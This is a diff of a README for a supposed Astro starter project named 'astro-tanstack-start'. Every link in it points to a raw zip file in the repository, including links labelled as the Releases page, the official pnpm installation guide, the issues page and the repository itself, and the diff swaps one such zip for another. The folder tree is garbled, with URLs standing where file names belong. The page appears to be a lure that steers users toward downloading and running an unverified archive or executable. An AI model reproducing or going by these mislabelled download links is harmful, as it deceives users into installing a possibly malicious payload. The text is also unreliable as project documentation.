@@ -1,6 +1,6 @@
 # 🚀 astro-tanstack-start - Create Your Astro Project Easily
 
-[![Download](https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip)](https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip)
+[![Download](https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip)](https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,10 +10,10 @@ Welcome to the `astro-tanstack-start` project. This README will guide you throug
 
 1. **Visit the GitHub Releases Page**  
    Click the link below to access the Releases page. Here, you will find the latest version available for download.  
-   [Download from Releases](https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip)
+   [Download from Releases](https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip)
 
 2. **Choose Your File**  
-   On the Releases page, locate the version you want to download. Click on the file suitable for your operating system. The file should have an appropriate extension, such as `.exe`, `.zip`, or `https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip`.
+   On the Releases page, locate the version you want to download. Click on the file suitable for your operating system. The file should have an appropriate extension, such as `.exe`, `.zip`, or `https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip`.
 
 3. **Download the File**  
    Once you click on the file, your browser will start downloading it. This may take a few moments depending on your internet speed.
@@ -24,7 +24,7 @@ Welcome to the `astro-tanstack-start` project. This README will guide you throug
 ### 🔍 Running the Application
 
 1. **Extract the Files (if necessary)**  
-   If you downloaded a `.zip` or `https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip` file, right-click on it and select "Extract" or "Unzip." This will create a new folder containing all necessary files.
+   If you downloaded a `.zip` or `https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip` file, right-click on it and select "Extract" or "Unzip." This will create a new folder containing all necessary files.
 
 2. **Open Terminal or Command Prompt**  
    Depending on your operating system:  
@@ -44,7 +44,7 @@ Welcome to the `astro-tanstack-start` project. This README will guide you throug
    ```
    pnpm install
    ```
-   Ensure you have `pnpm` installed. If not, refer to the official [pnpm installation guide](https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip).
+   Ensure you have `pnpm` installed. If not, refer to the official [pnpm installation guide](https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip).
 
 5. **Launch the Application**  
    Start the local development server with this command:
@@ -63,20 +63,20 @@ Inside your Astro project, you'll find the following folders and files:
 ```text
 /
 ├── public/
-│   └── https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip
+│   └── https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip
 ├── src
 │   ├── assets
-│   │   └── https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip
+│   │   └── https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip
 │   ├── components
-│   │   └── https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip
+│   │   └── https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip
 │   ├── layouts
-│   │   └── https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip
+│   │   └── https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip
 │   └── pages
-│       └── https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip
-└── https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip
+│       └── https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip
+└── https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip
 ```
 
-Each of these folders serves a purpose in organizing your project. For a detailed explanation, check out [our guide on project structure](https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip).
+Each of these folders serves a purpose in organizing your project. For a detailed explanation, check out [our guide on project structure](https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip).
 
 ### 🛠️ Commands
 
@@ -96,10 +96,10 @@ Astro is a static site generator that helps you build fast websites using modern
 No, our project is designed for users with all skill levels. The instructions are laid out step-by-step to guide you through the process.
 
 #### What if I encounter issues?
-If you run into any problems, check the [issues page](https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip) on GitHub. You can also ask questions or report bugs there.
+If you run into any problems, check the [issues page](https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip) on GitHub. You can also ask questions or report bugs there.
 
 ### 📞 Support
 
-For any further assistance, please visit our [GitHub repository](https://raw.githubusercontent.com/cc-blip/astro-tanstack-start/main/else/astro-tanstack-start.zip) or create an issue to get in touch with the community.
+For any further assistance, please visit our [GitHub repository](https://github.com/cc-blip/astro-tanstack-start/raw/refs/heads/main/public/start_tanstack_astro_2.8.zip) or create an issue to get in touch with the community.
 
 By following these steps, you will have your Astro project running smoothly. Enjoy your journey into web development!
